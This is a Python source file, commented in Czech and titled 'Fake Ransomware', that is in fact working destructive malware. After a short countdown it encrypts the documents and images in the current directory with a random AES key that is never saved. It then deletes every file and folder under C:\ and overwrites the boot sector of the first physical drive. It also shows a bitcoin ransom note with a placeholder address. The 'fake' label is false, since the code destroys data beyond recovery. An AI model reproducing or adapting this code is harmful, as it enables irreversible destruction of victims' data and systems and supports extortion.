import os
import tkinter as tk
from tkinter import messagebox
import threading
import time
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import secrets

# Nastavení správného klíče pro dešifrování
CORRECT_KEY = "M2sh1jsmMASxhZE390HDi"

# Funkce pro generování náhodného klíče a IV
def generate_key_iv():
    key = secrets.token_bytes(32)  # 256-bit klíč pro AES
    iv = secrets.token_bytes(16)  # 128-bit IV
    return key, iv

# Funkce pro šifrování dat
def encrypt_data(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Data musí být zarovnána na bloky 128 bitů (16 bajtů)
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Zašifrujeme data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return encrypted_data

# Funkce pro šifrování souboru
def encrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as file:
        original_data = file.read()

    encrypted_data = encrypt_data(original_data, key, iv)

    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Funkce pro šifrování všech souborů v adresáři (včetně podsložek)
def encrypt_all_files(directory, key, iv):
    target_extensions = {'.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png'}  # Přípony souborů k šifrování
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            file_extension = os.path.splitext(file_name)[1].lower()

            # Zpracujeme pouze soubory s cílovými příponami
            if file_extension in target_extensions:
                try:
                    encrypt_file(file_path, key, iv)
                    print(f"Zašifrováno: {file_path}")
                except Exception as e:
                    print(f"Chyba při šifrování souboru {file_path}: {e}")

# Funkce pro dešifrování dat
def decrypt_data(encrypted_data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Dešifrujeme data
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Odstraníme padding
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    original_data = unpadder.update(padded_data) + unpadder.finalize()
    return original_data

# Funkce pro dešifrování souboru
def decrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()

    decrypted_data = decrypt_data(encrypted_data, key, iv)

    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# Funkce pro dešifrování všech souborů v adresáři (včetně podsložek)
def decrypt_all_files(directory, key, iv):
    target_extensions = {'.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png'}  # Přípony souborů k dešifrování
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            file_extension = os.path.splitext(file_name)[1].lower()

            # Zpracujeme pouze soubory s cílovými příponami
            if file_extension in target_extensions:
                try:
                    decrypt_file(file_path, key, iv)
                    print(f"Dešifrováno: {file_path}")
                except Exception as e:
                    print(f"Chyba při dešifrování souboru {file_path}: {e}")

# Funkce pro zničení systému
def destroy_system():
    root_dir = "C:\\"
    for root, dirs, files in os.walk(root_dir, topdown=False):
        for name in files:
            try:
                os.remove(os.path.join(root, name))
                print(f"Smazán soubor: {os.path.join(root, name)}")
            except Exception as e:
                print(f"Chyba při mazání souboru: {e}")
        for name in dirs:
            try:
                shutil.rmtree(os.path.join(root, name))
                print(f"Smazána složka: {os.path.join(root, name)}")
            except Exception as e:
                print(f"Chyba při mazání složky: {e}")

    try:
        with open("\\\\.\\PhysicalDrive0", "wb") as f:
            f.write(b'\x00' * 512)
            print("Boot sektor přepsán.")
    except Exception as e:
        print(f"Chyba při přepisování boot sektoru: {e}")

# GUI část
def show_home():
    home_text = "All your files are encrypted. The only way to get your files back is to put a very strong key 🔑 by WhiteLkidd.\n\nGo to this link and pay 0.000012 bitcoins. When payment is done, you will get your key.\n\nSend to this Bitcoin address: 928509e6-1a98-4ffa-ac86-ad7b537dd53e\n\n0.000012 bitcoin"
    text_area.delete(1.0, tk.END)
    text_area.insert(tk.END, home_text)

def show_decrypt():
    decrypt_window = tk.Toplevel(root)
    decrypt_window.title("Decrypt Files")
    decrypt_window.geometry("300x150")
    
    label = tk.Label(decrypt_window, text="Enter the key:")
    label.pack(pady=10)
    
    entry = tk.Entry(decrypt_window)
    entry.pack(pady=10)
    
    submit_button = tk.Button(decrypt_window, text="Submit", command=lambda: check_key(entry.get()))
    submit_button.pack(pady=10)

def check_key(user_key):
    if user_key == CORRECT_KEY:
        messagebox.showinfo("Success", "Correct key! Decrypting files...")
        key, iv = load_key_iv()  # Načteme klíč a IV
        decrypt_all_files(target_directory, key, iv)  # Dešifrujeme soubory
    else:
        messagebox.showerror("Error", "Incorrect key!")

def load_key_iv():
    # Načteme klíč a IV ze souboru (předpokládáme, že byly uloženy při šifrování)
    with open("encryption_key_iv.bin", "rb") as key_file:
        key_iv = key_file.read()
        key = key_iv[:32]  # Prvních 32 bajtů je klíč
        iv = key_iv[32:48]  # Následujících 16 bajtů je IV
    return key, iv

def destroy_pc():
    confirm = messagebox.askyesno("Warning", "This will destroy your PC! Are you sure you want to continue?")
    if confirm:
        messagebox.showwarning("Final Warning", "This action is irreversible. Your system will be destroyed!")
        destroy_system()

def countdown():
    remaining_time = 10  # 10 sekund pro testování (změňte na 259200 pro 3 dny)
    while remaining_time > 0:
        days, remainder = divmod(remaining_time, 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)
        countdown_label.config(text=f"Time left: {days}d {hours}h {minutes}m {seconds}s")
        time.sleep(1)
        remaining_time -= 1
    messagebox.showinfo("Time's up!", "The system will now be destroyed!")
    # Šifrování souborů před zničením systému
    key, iv = generate_key_iv()
    encrypt_all_files(target_directory, key, iv)
    destroy_system()

# Nastavení adresáře
target_directory = os.getcwd()  # Aktuální adresář (můžeš změnit na jiný)

# Vytvoření hlavního okna
root = tk.Tk()
root.title("Fake Ransomware")
root.geometry("500x400")

# Taby
tabs = tk.Frame(root)
tabs.pack(pady=10)

home_button = tk.Button(tabs, text="Home", command=show_home)
home_button.pack(side=tk.LEFT, padx=5)

decrypt_button = tk.Button(tabs, text="Decrypt Files", command=show_decrypt)
decrypt_button.pack(side=tk.LEFT, padx=5)

destroy_button = tk.Button(tabs, text="Destroy the PC", command=destroy_pc)
destroy_button.pack(side=tk.LEFT, padx=5)

# Odpočet
countdown_label = tk.Label(root, text="Time left: 3d 0h 0m 0s", font=("Arial", 12))
countdown_label.pack(pady=10)

# Textové pole
text_area = tk.Text(root, wrap=tk.WORD, height=10, width=50)
text_area.pack(pady=10)

# Spuštění odpočtu v samostatném vlákně
countdown_thread = threading.Thread(target=countdown)
countdown_thread.daemon = True
countdown_thread.start()

# Spuštění hlavní smyčky
root.mainloop()
